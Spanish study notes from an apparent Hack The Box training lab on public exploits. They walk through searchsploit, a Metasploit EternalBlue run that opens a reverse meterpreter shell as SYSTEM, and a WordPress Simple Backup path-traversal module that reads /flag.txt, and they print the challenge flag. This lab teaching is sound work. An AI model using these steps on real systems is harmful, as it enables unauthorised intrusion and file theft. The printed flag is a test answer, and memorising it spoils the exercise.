## **EXPLOITS PUBLICOS**

Una vez que identificamos los servicios que se ejecutan en los puertos identificados a partir de nuestro escaneo Nmap, el primer paso es buscar si alguna de las aplicaciones/servicios tiene vulnerabilidades públicas. Se pueden encontrar exploits públicos para aplicaciones web y otras aplicaciones que se ejecutan en puertos abiertos, como SSH o ftp. 

___

### ECONTRANDO EXPLOITS PUBLICOS

Muchas herramientas pueden ayudarnos a buscar exploits públicos para las diversas aplicaciones y servicios que podemos encontrar durante la fase de enumeración. Una forma es buscar en Google el nombre de la aplicación con `exploit` para ver si obtenemos algún resultado: 

![Exploits](https://academy.hackthebox.com/storage/modules/77/google_smb.jpg)

Una herramienta muy conocida para este fin es `searchsploit`, que podemos utilizar para buscar vulnerabilidades/exploits públicos para cualquier aplicación. Podemos instalarlo con el siguiente comando:

~~~
$ sudo apt install exploitdb -y
~~~

Luego, podemos usar `searchsploit` para buscar una aplicación específica por su nombre, de la siguiente manera: 

~~~
$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------

~~~

También podemos utilizar bases de datos de exploits en línea para buscar vulnerabilidades, como [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/) o [Vulnerability Lab](https://www.vulnerability-lab.com/). El módulo [Introducción a las aplicaciones web](https://academy.hackthebox.com/module/details/75) discute las vulnerabilidades públicas de las aplicaciones web. 
___
### METASPLOIT PRIMER

Metasploit Framework (MSF) es una excelente herramienta para pentesters. Contiene muchos exploits incorporados para muchas vulnerabilidades públicas y proporciona una manera fácil de usar estos exploits contra objetivos vulnerables. MSF tiene muchas otras características, como: 
+ Ejecución de scripts de reconocimiento para enumerar hosts remotos y objetivos comprometidos

+ Scripts de verificación para probar la existencia de una vulnerabilidad sin comprometer realmente el objetivo

+ Meterpreter, que es una gran herramienta para conectarse a shells y ejecutar comandos en los objetivos comprometidos

+ Muchas herramientas de post-explotación y pivote 

Tomemos un ejemplo básico de búsqueda de un exploit para una aplicación que estamos atacando y cómo explotarlo. Para ejecutar Metasploit, podemos usar el comando `msfconsole`: 

~~~
 msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
~~~

Una vez que tengamos Metasploit ejecutándose, podemos buscar nuestra aplicación de destino con el comando `search exploit`. Por ejemplo, podemos buscar la vulnerabilidad SMB que identificamos anteriormente: 

~~~
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
   
~~~
Tip: La búsqueda puede aplicar filtros complejos como search cve:2009 type:exploit. Ver todos los filtros con búsqueda de ayuda 

Encontramos un exploit para este servicio. Podemos usarlo copiando el nombre completo del mismo y usando `USE` para usarlo: 

~~~
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
~~~

Antes de que podamos ejecutar el exploit, debemos configurar sus opciones. Para ver las opciones disponibles para configurar, podemos usar el comando `show options`: 

~~~
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...

~~~

Cualquier opción con el conjunto `Required` en sí debe establecerse para que funcione el exploit. En este caso, solo tenemos dos opciones para configurar: RHOSTS, que significa la IP de nuestro objetivo (esta puede ser una IP, varias IP o un archivo que contiene una lista de IP). Podemos configurarlos con el comando set: 

~~~
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
~~~

Una vez que tengamos configuradas ambas opciones, podemos comenzar la explotación. Sin embargo, antes de ejecutar el script, podemos ejecutar una verificación para asegurarnos de que el servidor sea vulnerable: 

~~~

msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.

~~~

Como podemos ver, el servidor es realmente vulnerable. Tenga en cuenta que no todos los exploits en `Metasploit Framework` admiten la función de verificación. Finalmente, podemos usar el comando `run` o `exploit` para ejecutar el exploit: 

~~~
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
~~~

Como podemos ver, pudimos obtener acceso de administrador al Box y usamos el comando de `shell` para colocarnos en un shell interactivo. Estos son ejemplos básicos del uso de Metasploit para explotar una vulnerabilidad en un servidor remoto. Hay muchas Box retiradas en la plataforma Hack The Box que son excelentes para practicar Metasploit. Algunos de estos incluyen, pero no se limitan a: 

+ Granny/Grandpa
+ Jerry
+ Blue
+ Lame
+ Optimum
+ Legacy
+ Devel

Más adelante, en este módulo, recorreremos paso a paso el Box `Nibbles`y luego mostraremos la explotación usando Metasploit. Metasploit es otra herramienta esencial para agregar a nuestro conjunto de herramientas, pero es crucial no solo confiar en ella. Para ser evaluadores completos, debemos saber cómo aprovechar mejor todas las herramientas disponibles, comprender por qué a veces fallan y saber cuándo cambiar a técnicas manuales u otras herramientas. 
___

### RETO

+ Intente identificar los servicios que se ejecutan en el servidor y luego intente encontrar exploits públicos para explotarlos. Una vez que lo haga, intente obtener el contenido del archivo '/flag.txt'. (nota: el servidor web puede tardar unos segundos en iniciarse) 

`R:HTB{my_f1r57_h4ck}`

Primero vamos a escanear puertos, no es posble hacer pin a un puerto, usamos `-Pn`para forzar el escaneo de puertos 
~~~
 nmap -sV -sC -Pn -p30960  46.101.61.42 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 13:57 UTC
Nmap scan report for 46.101.61.42
Host is up (0.45s latency).

PORT      STATE SERVICE VERSION
30960/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Getting Started &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.6.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds
~~~

Vemos que esta corriendo wordpress, podemos ver las vulnerabilidades que hay con estas versiones tanto de apache como de wordpress
~~~
$ searchsploit WordPress 5.6.1    

-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities       | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                 | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection               | php/webapps/48918.sh
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

~~~
$searchsploit Apache 2.4.41  

-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution           | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner         | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                       | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1 | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2 | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal       | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                         | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                       | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                 | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)              | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Ex | linux/remote/34.pl
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~


vemos todas las vulnerabilidades pero una de las practicas o detalles basicos son revisar en el navegador la ip para comprobar que es lo que nos muestra, en este caso nos muestra 

Simple Backup Plugin 2.7.10 for WordPress

Que quiere decir que esto es lo que podriamos usar para conseguir la flag, entonces buscaremos este exploit
~~~
msf6 > search exploit Simple Backup Plugin 2.7.10

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read                   normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read
~~~

usamos ese exploit y revisamos las opciones
~~~
msf6 > use 0
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

~~~

Como ya hemos visto tenemos que configurar `RHOST`y por supuesto el `RPORT`, pero un detalle en esta configuracion es FILEPATH, en esta opcion es que tenemos que colocar la ruta de lo que querramos obtener, en este caso lo tenemos que cambiar por `/flag.txt
~~~
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS 188.166.148.4
RHOSTS => 188.166.148.4

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set rport 32497
rport => 32497

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
~~~

y vemos entonces que la configuracion queda asi
~~~
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /flag.txt        yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     188.166.148.4    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      32497            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host
~~~

Ejecutamos el exploit:
~~~
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > exploit

[+] File saved in: /root/.msf4/loot/20220321154255_default_188.166.148.4_simplebackup.tra_126641.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
~~~

Ahora solo tendriamos que ubicar la ruta `/root/.msf4/loot/` y abrir el archivo `20220321154255_default_188.166.148.4_simplebackup.tra_126641.txt`

~~~
cat /root/.msf4/loot/20220321154255_default_188.166.148.4_simplebackup.tra_126641.txt

HTB{my_f1r57_h4ck}
~~~